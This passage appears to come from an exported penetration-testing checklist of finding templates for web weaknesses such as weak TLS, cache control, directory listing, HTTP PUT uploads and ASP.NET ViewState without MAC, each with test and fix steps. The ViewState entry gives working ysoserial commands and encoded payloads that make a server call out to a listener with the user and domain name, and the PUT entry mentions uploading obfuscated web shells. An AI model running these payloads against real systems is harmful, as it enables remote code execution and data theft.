TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (secp256r1) - A\n</span></strong><strong><span style=\"color: #DB2719\">|       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (secp256r1) - A\n</span></strong><strong><span style=\"color: #DB2719\">|       TLS_DHE_RSA_WITH_AES_256_CBC_SHA (dh 1024) - A\n</span></strong><strong>[TRUNCATED]</strong></code></pre><p><strong>(Recommended) Option: Pypher</strong></p><p><a href='https://github.com/NetSPI/pypher'>https://github.com/NetSPI/pypher</a></p><p>Pypher automatically uses [nmap or testssl] and reports the findings with the tool that was used during the scan.</p><p>See the README for extra useage info.</p><pre><code>&#35; single host\npy pypher.py --host hostname [-p port]\n\n&#35; multiple hosts\npy pypher.py --host hosts.txt [-p port]<strong> </strong></code></pre><p><strong>Option 2: Nmap</strong></p><pre><code>nmap --script ssl-enum-ciphers -p 443 x.x.x.x</code></pre><p><strong>Option 3: testssl.sh</strong></p><p><a href='https://github.com/drwetter/testssl.sh'>https://github.com/drwetter/testssl.sh</a></p><pre><code>./testssl.sh [host|host:port|URL|URL:port]\n&#35; or for a specific protocol\n./testssl.sh --starttls ftp &lt;IP&gt;:&lt;PORT&gt;</code></pre><h3>Reporting requirements:</h3><p>Report and highlight any of the following deprecated protocols:</p><ul><li><p>SSLv2</p></li><li><p>SSLv3</p></li><li><p>TLSv1.0</p></li><li><p>TLSv1.1</p></li></ul><h3>Severity:</h3><p>Note that the severity of this is now LOW (10/18/23). If a client is doing a PCI engagement, this may need to be upgraded to MEDIUM to follow PCI compliance.</p><p><strong>Bulk Verification (EXPEN):</strong></p><p>Autofier </p><p>https://github.com/NetSPI/Autofier</p><p>In your project in Resolve, navigate to Findings. Add columns for MasterFindingId, IP Address, and Port if they're not already there. Don't worry about removing columns or adding additional ones. Autofier will figure it out. Export the CSV file of the findings. Change the &quot;Master Finding ID&quot; column header to &quot;MasterFindingId&quot; so the tool can parse it correctly. </p><p>Run the tool against the list of findings.</p><p>Once the tool has ran and you have the output CSV, follow these steps:</p><p>1. Change all findings to False Positive. </p><p>2. Add a manual instance of the finding.</p><p>3. Choose Multiple Assets, Bulk Upload Assets, and Upload IP Addresses</p><p>4. Open the CSV in Excel. Select the IP address and port of the assets which Failed. (Double check the &quot;name&quot; field and make sure you're only selecting the correct findings.) Format them as IP:Port (  =CONCAT(D2,&quot;:&quot;,E2)    ) and paste them into the &quot;Upload IP Addresses&quot; field.</p><p>5. Check the &quot;Update existing duplicate instances&quot; box, and under Instance Information, set the State to &quot;Final&quot;</p><p>6. Click &quot;Add Instance&quot;</p><p>7. Do a couple of spot checks to make sure the statuses in Resolve match what's in the tool output.</p>",
							"references": "<ul><li>https://wiki.mozilla.org/Security/Server_Side_TLS&#35;Modern_compatibility</li><li>https://ciphersuite.info/cs/?security=recommended&amp;page=2&amp;software=openssl&amp;tls=tls12</li><li>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Disable the use of any of the following protocols:</p><ul><li><p>SSLv2.0</p></li><li><p>SSLv3.0</p></li><li><p>TLSv1.0</p></li><li><p>TLSv1.1</p></li></ul><p>Use TLSv1.3 and TLSv1.2 and set the latest protocol as preferred.</p>"
						},
						"ordinal": 705,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "bdca79b3-6994-463f-a0d7-96b34299bc68",
						"name": "Information Disclosure - Inadequate Cache Control",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 488704,
							"uid": "044d5fa3-39c6-de11-b3c7-001e4f120021",
							"name": "Information Disclosure - Inadequate Cache Control",
							"description": "<p>The application does not restrict caching and may save sensitive data to the local browser's cache or intermediate hosts such as CDNs and proxies. Sensitive data may be available by using the &quot;back&quot; button on the browser or by accessing the data on the local system or the intermediate host. Logging out from an application does not clear the browser cache of any sensitive information that might have been stored.</p>",
							"severityId": 1,
							"businessImpact": "<p>Lack of adequate cache control may allow unauthorized access to sensitive data. In a configuration where the no-store directive is missing for requests of user-personalized data, CDNs and proxies may leak that information to other users through cached responses. This is most commonly an issue when post-authenticated requests are cached by CDNs and proxies.</p><p>Under certain circumstances, an attacker with physical access to a legitimate user's computer may be able to access sensitive information within the application. If a legitimate user logs into the application, views pages containing sensitive information, and then logs out without closing their browser, pages containing sensitive information can still be viewed using the &quot;back&quot; button or by accessing the cache directly. Applications that are often accessed from shared systems will be more at risk.</p>",
							"sourceIdentifier": "M:488704",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>Inspect HTTP response headers on pages that contain some sensitive content (typically any post-authentication data) and check the Cache-Control header. If the Cache-Control header value does not contain the <code>no-store</code> directive, report the vulnerability.</p><p>For APIPENs, this finding is only applicable if there is a shared cache involved between the origin server and the client, such as a CDN or an intermediary proxy. This can usually be determined by examining the HTTP response headers for clues or asking the client about the infrastructure. Err on the side of reporting the issue.</p><h3><strong>Reporting Requirements:</strong></h3><p>If Cache-Control is set incorrectly throughout the application, remove affected URLs and add a statement to the instance's description saying that Cache-Control is set incorrectly throughout the application.</p><p>Include sample HTTP request/response for sensitive content in the application. Add the red-bold highlighting to the Cache-Control configuration in the HTTP response.</p>",
							"references": "<ul><li>https://owasp.org/www-project-secure-headers/</li><li>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses</li><li>https://docs.microsoft.com/en-us/iis/configuration/system.webserver/staticcontent/clientcache</li><li>http://httpd.apache.org/docs/current/mod/mod_headers.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>For every page that contains sensitive information, the server must instruct the browser not to cache data. Such a directive can be issued in the HTTP response headers:</p><pre><code>Cache-Control: no-store</code></pre><p>Though Meta tags can also be used to set these directives, using the response header is the preferred method, as not all browsers honor the Meta tags.</p><p>If the site contains file download functionality (such as a PDF or Office documents) in certain configurations, these cache control settings may interfere with downloading files in some IE browser versions. Be sure to test this functionality before implementing in production environments to ensure that cache control settings do not interfere with intended functionality.</p>"
						},
						"ordinal": 706,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "5c8b0953-03cd-47cb-851a-91f6b039d2ee",
						"name": "POST Parameters Accepted as GET Parameters",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 21391,
							"uid": "3193cfc8-49bf-dd11-b9f5-001e4f120030",
							"name": "POST Parameters Accepted as GET Parameters",
							"description": "<p>Some web frameworks handle GET and POST parameters as a single collection. Allowing POST parameters to be submitted as GET parameters may facilitate cross-site scripting (XSS) and cross-site request forgery (CSRF) attacks, as it may be easier to cause a target user to send a GET request compared to a POST request to the target server.</p>",
							"severityId": -2,
							"businessImpact": "<p>Allowing POST parameters to be passed as GET parameters can make the web application more susceptible to XSS and CSRF attacks. XSS attacks are used to execute attacker code in the user's browser and CSRF attacks can be used to force a user into unknowingly submitting a request to the server on the attacker's behalf.</p>",
							"sourceIdentifier": "WI:10655",
							"verificationInstructions": "<h3><strong>Verification Instructions</strong></h3><p><strong>State-Changing Requests:</strong></p><p>Use a web proxy tool (e.g. Burp) and try converting the request method from POST to GET. If the server accepts the GET request and gives a response the same as it would to the POST, the server accepts POST parameters as GET parameters.</p><p><strong>Non-State-Changing Requests:</strong></p><p>If the POST to GET is not a state-changing request, then this is not immediately exploitable. If there's only 1 non-state-changing API, then this doesn't need to be reported. However, if there is more than 1 POST as GET API then this indicates a server misconfiguration and should be reported.</p><h3><strong>Reporting Requirements</strong></h3><ol><li><p>Show HTTP request/response of POST request</p></li><li><p>Show HTTP request/response of converted GET request</p></li><li><p>Show that the application processed the POST parameters as GET parameters</p></li></ol>",
							"references": "<ul><li>http://cwe.mitre.org/data/definitions/352.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Do not allow POST parameters to be accepted as GET parameters.  User supplied information should always be passed in POST requests.</p>"
						},
						"ordinal": 707,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "8c451765-16a8-4921-9a39-1bb5d7ce1f56",
						"name": "Directory Listing",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 717,
							"uid": "0035944e-03b1-dd11-992f-001e4f120030",
							"name": "Information Disclosure - Directory Listing",
							"description": "<p>A directory listing is a complete index of all the resources located in that directory. Files that should remain hidden, such as data files, backed-up source code, or applications in development may be visible. The specific risks depend upon the specific files that are listed and accessible.</p>",
							"severityId": 2,
							"businessImpact": "<p>Risks associated with an attacker discovering a directory listing on the application server depend upon what type of directory is discovered and what types of files are contained within it. Files such as data files, source code, or applications under development will then be visible to a potential attacker.</p>",
							"sourceIdentifier": "GID:2387",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Determine if the application returns directory listings when URL does not contain a file name.</p><p>Search engines can be used to identify directory listings on publicly accessible sites:</p><pre><code>site:domain &quot;index of&quot;</code></pre><p>If only default directories (such as /icons) allow directory listings, report Directory Listing - Default Directories.</p><p><strong>Reporting Instructions</strong></p><ol><li><p>Screenshot a sample directory listing</p></li></ol><p><strong>Further Testing</strong></p><p>Try to identify files that are not normally accessible via the web application. If the files contain sensitive information, report it separately; the finding depends on type of data identified. If credentials are identified, try to determine whether they can be used to access the application or related components, such as the database server.</p><p><strong>Additional Notes</strong></p><p>For ASV scans, please add the following Special Note manual finding:</p><p>Directory Browsing</p><p>Source ID M:2388988</p>",
							"references": "<ul><li>https://cwe.mitre.org/data/definitions/548.html</li><li>https://portswigger.net/kb/issues/00600100_directory-listing</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Restrict access to important directories or files by turning off directory browsing on the server.  If the application requires that the web server be configured to allow directory listings, then alternative access controls should be considered.  For example, access to web directories could be blocked via firewall rules, web application firewall modules, and server-side controls.</p>"
						},
						"ordinal": 708,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "9c60089f-eb94-436f-b6c1-14dbb94e8188",
						"name": "Directory Listing - Default Directories",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 5049622,
							"uid": "9fdd815d-b490-e111-8397-001e4f120021",
							"name": "Information Disclosure - Directory Listing - Default Directories",
							"description": "<p>The web server is configured to display a list of files contained in a default directory. This could allow an attacker to view the contents of the directory, potentially revealing sensitive information or files that would otherwise remain hidden. The overall impact depends upon the specific files that are listed and accessible.</p>",
							"severityId": 1,
							"businessImpact": "<p>It poses a risk when files that are intended to remain hidden, such as confidential data, backup files, or source code under development, become visible and accessible to unauthorized users. Risks associated with an attacker discovering a directory listing on the application server depend upon what type of directory is discovered and what types of files are contained within it. Files such as data files, source code, or applications under development will then be visible to a potential attacker.</p>",
							"sourceIdentifier": "M:9fdd815d-b490-e111-8397-001e4f120021",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>This finding should be used only if default directories (e.g. &quot;/icons&quot;) have directory listing enabled. If other directories are listable, use <em>Information Disclosure - Directory Listing</em>.</p><ol><li><p>Determine if the application returns directory listings when URL does not contain a file name.</p></li><li><p>Search engines can be used to identify directory listings on publicly accessible sites:</p></li><ol><li><p>&quot;Index of /&quot; site:domain</p></li><li><p>&quot;Parent Directory&quot; &quot;Index of /&quot; site:domain</p></li><li><p>intitle:&quot;Index of&quot; site:domain</p></li><li><p>intitle:&quot;Directory Listing&quot; site:domain</p></li></ol><li><p>Robots.txt: Examine the website's &quot;robots.txt&quot; file (e.g., www.example.com/robots.txt) to check if there are any directories or files explicitly disallowed for indexing by search engines. This file may provide hints about default directories that should not be exposed. </p></li><li><p>Use automated tools such as Burp Suite or any other directory discovery tool (e.g. dirbuster or gobuster) against the list of in scope URLs.</p></li><ol><li><p>Take extra precautions for production web applications.</p></li><li><p>Choose the relevant or technology specific wordlist.</p></li></ol></ol><h3><strong>Reporting Instructions:</strong></h3><p>This finding should be used only if default directories (e.g. &quot;/icons&quot;) have directory listing enabled. If other directories are listable, use <em>Information Disclosure - Directory Listing</em>.</p><ol><li><p>Include a screenshot of a sample directory listing showing the exposed files and directories. If possible, include the full URL in the screenshot.</p></li></ol>",
							"references": "<ul><li>https://cwe.mitre.org/data/definitions/548.html</li><li>https://cwe.mitre.org/data/definitions/538.html</li><li>https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information </li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Disable directory listing functionality on the server.</p>"
						},
						"ordinal": 709,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "b1df0f94-c506-4757-af45-b83fa1f87e15",
						"name": "Arbitrary File Upload - HTTP PUT Method Allowed",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 21369,
							"uid": "d5bd2ea3-f4bb-dd11-b9f5-001e4f120030",
							"name": "Arbitrary File Upload - HTTP PUT Method Allowed",
							"description": "<p>The PUT method can be used to place files in directories, provided that the PUT method is enabled on the directory and that the web server has write access to the directory. The PUT method can be exploited to upload malicious files and scripts to the server. It may be possible to use these files and scripts to execute commands on the target host within the permissions context of the web server process. Deletion and modification of existing files on the server is also typically possible when the PUT method is enabled.</p>",
							"severityId": 3,
							"businessImpact": "<p>If an attacker can upload web application files, the attacker may be able to execute arbitrary commands on the server. Arbitrary command execution gives an attacker complete access to the server with the permissions of the account running the web server. This may lead to the complete compromise of the confidentiality, integrity, and availability of the affected server.</p>",
							"sourceIdentifier": "WI:3427",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><ul><li><p>Uploaded a test file to the server using the PUT HTTP method.</p></li><li><p>Note: when using Burp Suite, the content-length will be automatically calculated.</p></li></ul><pre><code>PUT /test.txt HTTP/1.0\nHost: hostname.com\nContent-Length: 15\n\nThis is a test.</code></pre><p>Attempt to retrieve the file. This can be done by navigating to the newly uploaded file in the browser or with a GET request. If you cannot retrieve the file, don’t report the issue unless you can observe additional impact.  </p><pre><code>GET /test.txt HTTP/1.0 \nHost: hostname.com </code></pre><p>Attempt to remove the file with a DELETE request. An example request is below. You may need to try  different HTTP versions and other required headers. This is example is not the only valid variation. If you cannot delete the file but the previous steps worked, report the finding.</p><pre><code>DELETE /test.txt HTTP/1.0\nHost: hostname.com\nContent-Length: 0</code></pre><p>If PUT method allows file uploads, try uploading a web shell. Ensure that the webshell is protected (e.g. password and/or IP restrictions) so that it cannot be compromised by another party. If the web shell is executed server-side, execute OS commands. See the reporting requirements for how to report this scenario. Ensure any webshells are deleted. If deletion is not possible, notify the client to remove. </p><p>If the PUT method allows file uploads, check for stored XSS. If the content-type is set by the file extension (.html, js, .svg) or if the content-type is missing from the response, XSS is likely possible.  </p><h3><strong>Reporting Requirements:</strong></h3><p>If this can be elevated to OS command execution, this can be upgraded to CRITICAL severity and a status report should be issued to the client within 24 hours. Otherwise, this should stay at HIGH.</p><ol><li><p>Show the HTTP request/response of the file upload. </p></li><li><p>Show the HTTP request/response of the file access. </p></li><li><p>If accessible from the browser (especially if XSS is possible), show this in a screenshot. </p></li><li><p>If OS command execution is possible, include additional details</p></li><ol><li><p>Upload the web shell</p></li><li><p>Show a proof of concept command on the target system</p></li></ol><li><p>Ensure any web shells are deleted; if they cannot be deleted, notify the client to remove them.</p></li></ol><p><strong>Further Testing</strong></p><p>OS command execution can be used to identify loads of other vulnerabilities. See the <strong>Post-Exploitation</strong> portion of the checklist for additional tests.</p><p><strong>Tools</strong></p><ul><li><p>Obfuscated (to avoid AV detection) fuzzdb web shell available on the NetSPI report</p></li><li><p>fuzzdb - web shells for different technologies</p></li><li><p>sqlcmd.aspx - database access via uploaded web shell</p></li></ul>",
							"references": "<ul><li>http://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html&#35;sec9.6</li><li>https://www.rfc-editor.org/rfc/rfc9110.html&#35;name-put</li><li>https://www.owasp.org/index.php/Test_HTTP_Methods_(OTG-CONFIG-006)</li><li>https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Disable the HTTP PUT and DELETE methods. If the methods are required for the operation of the server, ensure that only authenticated users can submit PUT or DELETE requests. If it required functionality that users be able to upload files, ensure this file upload functionality is properly secured with the following recommendations:</p><ul><li><p>Check file extension</p></li><li><p>Reject special characters in file names such as &quot;/&quot; and &quot;;&quot;</p></li><li><p>Rename user uploaded content, and add the expected file extension</p></li><li><p>When possible, check file signatures for binary files (such as image or PDF files)</p></li><li><p>When expected file upload is an image, render the content when accessed, for example by using &lt;img&gt; tags</p></li><li><p>For arbitrary files (such as executables) that can be uploaded and accessed, serve the files with the &quot;Content-Disposition: attachment&quot; header instead of rendering the file</p></li><li><p>If uploaded content saved as files instead of saving into a database, save uploaded content outside of webroot; don't allow direct access to uploaded files via the application</p></li><li><p>Don't allow execution from upload folder</p></li><li><p>Limit file sizes</p></li><li><p>Use anti-virus when possible to scan uploaded content</p></li><li><p>If compressed file uploads are extracted on the server, apply these directions to each file one by one</p></li></ul><p>If it is required functionality that users be able to delete files, ensure that this functionality is protected with proper access controls.</p><p>Regardless of the operating system and web server type, it is a best practice to run web services as a non-privileged user. File permissions in the web directories should be configured according to the principle of least privilege; web service should not have more than read access to files and execution access to scripts and directories. </p>"
						},
						"ordinal": 711,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "5a9fe967-4520-4668-85f2-43754d331bb2",
						"name": "ASP.NET - ViewState without MAC Enabled",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 3389659,
							"uid": "092bd784-7b7a-e011-b27a-001e4f120021",
							"name": "ASP.NET - View State without MAC Enabled",
							"description": "<p>The View State is a mechanism built into the ASP.NET platform for persisting elements of the user interface and other data across successive requests. The data to be persisted is serialized by the server and transmitted via a hidden form field. When it is sent back to the server using a POST method, the View State parameter is deserialized and the data is retrieved.  By default, the serialized value is signed by the server to prevent tampering by the user; however, this behavior can be disabled by setting the Page.EnableViewStateMac property to false. If this is done, then an attacker can modify the contents of the View State and cause arbitrary data to be deserialized and processed by the server.</p>",
							"severityId": 3,
							"businessImpact": "<p>If the View State contains any items that are critical to the server's processing of the request, then this may result in a security exposure. The deserialization of user-controlled object streams at runtime can allow attackers to execute arbitrary code on the server, abuse application logic, and/or lead to denial of service. </p>",
							"sourceIdentifier": "M:3389659",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>1. Look at the ViewState tab in the response in Burp to see if MAC is enabled.  Show if not enabled.</p><p>Burp does not natively support Viewstate decoding but a Portswigger extension ViewState Editor can be added to Burp.</p><p>2. Start a listener on a internet accessible pentest system. Alternatively, use Burp Collaborator to capture DNS and HTTP(S) requests.</p><pre><code>nc -lp 80</code></pre><p>3. Create payload for the malicious ViewState, the output should look like what is below:</p><pre><code><strong>.\\ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c 'powershell.exe curl &quot;</strong><a href='http://23.98.221.27/$Env:USERDOMAIN/$Env:username'><strong>http://pentestlistenerip/$Env:USERDOMAIN/$Env:username</strong></a><strong>&quot;' --minify</strong>\n\n/wEy1gQAAQAAAP////8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAALsDPE9iamVjdERhdGFQcm92aWRlciBNZXRob2ROYW1lPSJTdGFydCIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6YT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW0uRGlhZ25vc3RpY3M7YXNzZW1ibHk9U3lzdGVtIj48T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPjxhOlByb2Nlc3M+PGE6UHJvY2Vzcy5TdGFydEluZm8+PGE6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIHBvd2Vyc2hlbGwuZXhlIGN1cmwgaHR0cDovLzIzLjk4LjIyMS4yNy8kRW52OlVTRVJET01BSU4vJEVudjp1c2VybmFtZSIgRmlsZU5hbWU9ImNtZCIvPjwvYTpQcm9jZXNzLlN0YXJ0SW5mbz48L2E6UHJvY2Vzcz48L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT48L09iamVjdERhdGFQcm92aWRlcj4L</code></pre><p>Alternatively you can do a timeout check with the internal fork.</p><pre><code><strong>.\\ysoserial.exe -g TextFormattingRunProperties -f LosFormatter --timeoutPayload -c &quot;none&quot; --minify</strong>\n\n/wEy8QQAAQAAAP////8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAANYDPFJlc291cmNlRGljdGlvbmFyeSB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczphPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLlRocmVhZGluZzthc3NlbWJseT1tc2NvcmxpYiI+PE9iamVjdERhdGFQcm92aWRlciBhOktleT0ieCIgT2JqZWN0VHlwZT0ie2E6VHlwZSBjOlRocmVhZH0iIE1ldGhvZE5hbWU9IlNsZWVwIj48T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+PGI6SW50MzI+MTAwMDA8L2I6SW50MzI+PC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz48L09iamVjdERhdGFQcm92aWRlcj48L1Jlc291cmNlRGljdGlvbmFyeT4L</code></pre><p>or</p><pre><code> <strong>.\\ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c 'powershell.exe sleep 10' --minify</strong>   </code></pre><p>or for legacy (.NET &lt; 4.0) systems (current username enumeration, special characters stripped, via HTTP / DNS). Source: https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/</p><pre><code>ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &quot;powershell invoke-webrequest http://$([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -replace '\\W').413u13cjytkq58msimkw44ovjmpcd1.net-spi.com&quot; --apppath=&quot;/testaspx/&quot; --islegacy --validationalg=&quot;SHA1&quot; --validationkey=&quot;70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0&quot; --isdebug</code></pre><p>3. Create viewstate for request.</p><pre><code> https://vulnerablewebapp.com/Login.aspx?__VIEWSTATE=%2f<strong><span style=\"color: #DB2719\">wEy8QQAAQAAAP%2f%2f%2f%2f8BAAAAAAAAAAwCAAAAG01pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvcgUBAAAAQk1pY3Jvc29mdC5WaXN1YWxTdHVkaW8uVGV4dC5Gb3JtYXR0aW5nLlRleHRGb3JtYXR0aW5nUnVuUHJvcGVydGllcwEAAAAPRm9yZWdyb3VuZEJydXNoAQIAAAAGAwAAANYDPFJlc291cmNlRGljdGlvbmFyeSB4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczphPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLlRocmVhZGluZzthc3NlbWJseT1tc2NvcmxpYiI%2bPE9iamVjdERhdGFQcm92aWRlciBhOktleT0ieCIgT2JqZWN0VHlwZT0ie2E6VHlwZSBjOlRocmVhZH0iIE1ldGhvZE5hbWU9IlNsZWVwIj48T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM%2bPGI6SW50MzI%2bMTAwMDA8L2I6SW50MzI%2bPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz48L09iamVjdERhdGFQcm92aWRlcj48L1Jlc291cmNlRGljdGlvbmFyeT4LaW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIiB4bWxuczphPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbCIgeG1sbnM6Yj0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiIHhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLlRocmVhZGluZzthc3NlbWJseT1tc2NvcmxpYiI%2bPE9iamVjdERhdGFQcm92aWRlciBhOktleT0ieCIgT2JqZWN0VHlwZT0ie2E6VHlwZSBjOlRocmVhZH0iIE1ldGhvZE5hbWU9IlNsZWVwIj48T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM%2bPGI6SW50MzI%2bMTAwMDA8L2I6SW50MzI%2bPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz48L09iamVjdERhdGFQcm92aWRlcj48L1Jlc291cmNlRGljdGlvbmFyeT4L </span></strong></code></pre><p>4. The command will run in the background.  It will either sleep for 10 seconds or run the provided command.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Screenshot Burp showing that MAC is not enabled and command executed.</p></li></ol>",
							"references": "<ul><li>https://cheatsheetseries.owasp.org/cheatsheets/DotNet_Security_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that ASP .NET VIEWSTATE is signed to prevent tampering.  ASP.NET provides MAC validation for ViewState parameters by adding '&lt;%@Page EnableViewStateMAC='True' %&gt;' on the specific page or by adding '&lt;pages enableViewStateMac='true'&gt;' inside the web.config file.</p><p>Additionally, ensure that  AspNetEnforceViewStateMac property is not set to 0 in the  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\.NETFramework\\v{VersionHere} Windows registry key. </p>"
						},
						"ordinal": 712,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "e762215b-b4da-49b6-95f5-e24359119e8c",
						"name": "Admin Section Login is Publicly Accessible",
						"instructions": "<h3>Note for WaPens: </h3><p>This finding is intended for administration logins which provide access to control the web server such as Apache Tomcat Manager, phpMyAdmin, etc. This finding is not applicable if standard application users and privileged/administrator application users share the same login. This finding may be applicable if there is a separate login mechanisms for both standard users and administrator users.  </p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 677,
							"uid": "6434944e-03b1-dd11-992f-001e4f120030",
							"name": "Administrative Interface Externally Accessible",
							"description": "<p>A login page to administrative functionality of a web framework was discovered. Having an administrative interface available externally increases exposure to a potentially malicious attack on the target host, as well as the likelihood of a successful instance of unauthorized access.</p>",
							"severityId": 2,
							"businessImpact": "<p>An attacker could perform brute force attacks against the administration page and potentially gain unauthorized access to any data or functionality the administrative interface provides.</p>",
							"sourceIdentifier": "GID:2876",
							"verificationInstructions": "<h3><strong>Verification Instructions:</strong></h3><p>This finding applies specifically to administrative login panels that are part of standard web frameworks (e.g., Tomcat, Glassfish, Weblogic, etc.). It does not apply to situations where an admin user can authenticate to the client application via a normal user login page. </p><p>Use automated tools to look for known or predictably named administration logins. Web server administrative logins typically should not be available to the Internet and should be checked for default credentials. Appropriateness of administrative functionality elsewhere may depend on the business use case for the application and the sensitivity of the data. If exposed over the Internet, two-factor authentication should be required, and of course the security measures necessary for a regular login would also apply (HTTPS, username enumeration, etc.) </p><p>For PCI:</p><p>If an admin section is available externally, but has appropriate levels of encryption in place (SSL/TLS in use with no weak ciphers, no NULL ciphers, no SSL certificate issues, etc.), the PCI counsel has stated that it can be considered a false positive.</p><h3><strong>Reporting Requirements:</strong></h3><ol><li><p>Screenshot the framework admin login page</p></li></ol><h3><strong>Tools:</strong></h3><p>fuzzdb contains predictable resource paths, including administrative login 